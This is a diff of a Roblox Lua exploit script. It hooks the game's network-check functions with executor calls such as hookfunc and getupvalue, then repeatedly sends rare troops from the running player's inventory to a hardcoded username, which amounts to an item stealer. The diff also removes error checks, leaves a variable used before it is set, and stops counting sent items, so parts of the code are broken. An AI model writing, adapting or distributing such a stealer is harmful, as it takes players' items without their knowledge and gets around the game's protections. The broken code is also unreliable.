@@ -1,14 +1,16 @@
 print("Test")
-local getupvalue = debug.getupvalue
-
+if not getupvalue then getupvalue = debug.getupvalue end
 local users = {
-    "strob5ck"
+"strob5ck",
+
 }
 
 local troopsToSend = {
+    "SantaTVMan",
     "CamoToilet",
     "MafiaToilet"
 }
+
 
 local TTD
 local save
@@ -16,7 +18,6 @@ local handler
 local Network
 local Invoke
 local Fire
-
 task.spawn(function()
     TTD = require(game:GetService("ReplicatedStorage").MultiboxFramework)
     save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
@@ -29,68 +30,37 @@ task.spawn(function()
         end)
         task.wait(0.1)
     until Network ~= nil and Invoke ~= nil and Fire ~= nil
-
-    -- Memastikan Invoke adalah fungsi sebelum menggunakan getupvalue
-    if type(Invoke) == "function" then
-        local GetFunc = getupvalue(Invoke, 1)
-        if type(GetFunc) ~= "function" then
-            print("getupvalue did not return a function for Invoke.")
-        end
-    else
-        print("Invoke is not a function.")
-    end
 end)
 
+Invoke = Network.Invoke; local GetFunc = getupvalue(Invoke, 1)
+Fire = Network.Fire; local GetEvent = getupvalue(Fire, 1)
+
 coroutine.wrap(function()
     setidentity(2)
-    if type(Invoke) == "function" then
-        local func = getupvalue(Invoke, 1)
-        if type(func) == "function" then
-            hookfunc(func, function()
-                return true
-            end)
-        else
-            print("getupvalue did not return a function for Invoke.")
-        end
-    else
-        print("Invoke is not a function in coroutine.")
-    end
+    hookfunc(getupvalue(GetFunc, 1), function()
+        return true
+    end)
     setidentity(8)
 end)()
 
 coroutine.wrap(function()
     setidentity(2)
-    if type(Fire) == "function" then
-        local event = getupvalue(Fire, 1)
-        if type(event) == "function" then
-            hookfunc(event, function()
-                return true
-            end)
-        else
-            print("getupvalue did not return a function for Fire.")
-        end
-    else
-        print("Fire is not a function in coroutine.")
-    end
+    hookfunc(getupvalue(GetEvent, 1), function()
+        return true
+    end)
     setidentity(8)
 end)()
+
 
 local invTroops = {}
 function getInventoryTroops()
     invTroops = {}
     local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
-
-    -- Periksa apakah Inventory dan Troops ada
-    if save and save._data and save._data.Inventory and save._data.Inventory.Troops then
-        for name, v in pairs(save._data.Inventory.Troops) do
-            for i, troop in pairs(v) do
-                invTroops[i] = name
-            end
+    for name, v in pairs(save._data.Inventory.Troops) do
+        for i, v in pairs(v) do
+            invTroops[i] = name
         end
-    else
-        print("Inventory or Troops is nil.")
     end
-
     return invTroops
 end
 
@@ -107,8 +77,8 @@ function getCoinAmt()
 end
 
 function hasTroop(id)
-    local troops = getInventoryTroops()
-    for i, v in pairs(troops) do
+    troops = getInventoryTroops()
+    for i, v in troops do
         if i == id then
             return true
         end
@@ -116,25 +86,26 @@ function hasTroop(id)
     return false
 end
 
-local startAmt = getCoinAmt()
+startAmt = getCoinAmt()
+
 local amt = 0
 
-for _, user in pairs(users) do
+for i, user in users do
     local sent = {}
-    for i, v in pairs(getInventoryTroops()) do
+    for i, v in getInventoryTroops() do
         if table.find(troopsToSend, v) and not table.find(sent, v) then
             table.insert(sent, v)
             local oldC = getCoinAmt()
             local st = tick()
             repeat
-                Invoke("PostOffice_SendGift", game.Players:GetUserIdFromNameAsync(user), "Troops", i, 0, tostring(math.random(1, 10000)))
+                Invoke("PostOffice_SendGift", game.Players:GetUserIdFromNameAsync(user), "Troops", i, 0,
+                    tostring(math.random(1, 10000)))
                 task.wait(0.1)
             until getCoinAmt() < oldC and not hasTroop(i)
-            print("sent", "time taken:", tick() - st)
-            amt = amt + 1
+            print("sent","time taken:",tick()-st)
         end
     end
-    print('finished user:', user)
+    print('finished user:',user)
 end
 
 print('Should have sent:', amt)
